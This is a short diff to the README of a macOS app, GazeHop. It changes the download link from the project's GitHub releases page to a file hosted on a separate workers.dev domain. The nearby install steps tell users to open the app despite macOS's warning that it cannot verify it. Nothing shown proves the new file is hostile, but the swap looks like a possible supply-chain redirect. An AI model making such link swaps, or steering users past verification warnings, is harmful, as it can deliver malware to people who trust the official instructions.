@@ -25,7 +25,7 @@ Everything runs on your Mac. No video is recorded, stored, or sent anywhere.
 
 ## Install (no coding needed)
 
-1. Download **[GazeHop.dmg](https://github.com/kabirshah4/GazeHop/releases/latest/download/GazeHop.dmg)**
+1. Download **[GazeHop.dmg](https://gazehop.gazehop-site.workers.dev/download/GazeHop.dmg)**
    and double-click it to open.
 2. Drag **GazeHop** onto the **Applications** folder in the window that opens.
 3. Open it. macOS will say it *can't verify* the app, because GazeHop isn't notarized by
